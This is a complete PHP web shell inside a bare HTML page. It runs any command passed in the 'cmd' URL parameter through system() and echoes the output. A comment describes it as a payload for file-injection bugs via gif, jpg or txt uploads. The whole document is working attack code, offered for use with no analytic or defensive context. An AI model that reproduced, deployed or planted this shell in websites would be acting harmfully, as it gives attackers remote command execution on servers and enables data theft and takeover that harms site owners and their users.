<html>
<body>

<?php
  $md=$_GET['cmd'];
  // CMD - To Execute Command on File Injection Bug ( gif - jpg - txt )
  if (isset($chdir)) @chdir($chdir);
  ob_start();
  system("$md 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
  $output = ob_get_contents();
  ob_end_clean();
  if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
?>
 </body>
</html>